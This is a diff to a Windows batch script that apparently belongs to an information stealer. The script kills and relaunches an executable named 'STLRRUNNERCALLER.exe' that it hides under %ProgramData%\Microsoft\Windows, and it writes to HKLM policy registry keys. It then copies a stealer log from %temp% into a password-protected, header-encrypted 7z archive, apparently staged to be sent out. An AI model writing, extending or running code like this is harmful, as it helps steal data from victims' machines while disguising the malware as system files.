@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=10.3"
+set "BATCHVERSION=10.4"
 
 
 
@@ -181,7 +181,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 echo Killing Tasks
-::taskkill /F /IM STLRRUNNERCALLER.exe
+taskkill /F /IM STLRRUNNERCALLER.exe
 echo.
 
 
@@ -195,11 +195,11 @@ goto :NEXT3
 tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
 if %errorlevel% neq 0 (
     echo STLRRUNNERCALLER.exe is not running.
-    set "CheckSend=1"
+    ::set "CheckSend=1"
     echo CheckSend=%CheckSend%
     echo Starting STLRRUNNERCALLER...
-    start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-    set "MESSAGE=STLRSTARTED|"
+    ::start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+    ::set "MESSAGE=STLRSTARTED|"
     echo Started.
 ) else (
     echo STLRRUNNERCALLER.exe is already running.
@@ -1678,11 +1678,20 @@ echo.
 echo.
 
 
+
+
 ::goto PEROTY
 
 
 
+
+
+
+
+
 set "ZIP_FILEMS=%temp%\mseuopefiles.7z"
+set "LOGSTLR=%temp%\LGSTLRR.ever"
+
 rem Delete existing ZIP file to ensure fresh compression
 if exist "%ZIP_FILEMS%" del /f /q "%ZIP_FILEMS%"
 echo Deleted.
@@ -1690,22 +1699,12 @@ echo Deleted.
 echo.
 echo.
 
-
-rem Collect all .mseuope files in %temp%
-set "FileList="
-
-for %%F in ("%temp%\*.mseuope") do (
-    set "FileList=!FileList! "%%F""
-)
-
-if not defined FileList (
-    echo No .mseuope files found in %temp%.
-)
-
-echo 1 > "%temp%\testA.mseuope"
+del /f /q "%LOGSTLR%"
+type "%temp%\STLRLOG.mseuope" >> "%LOGSTLR%"
 
 rem Compress the files using 7-Zip
-"%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILEMS%" !FileList!
+"%SVNzip_PATH%" a -p"%Password%" -mhe=on "%ZIP_FILEMS%" "%LOGSTLR%"
+
 
 echo.
 echo.
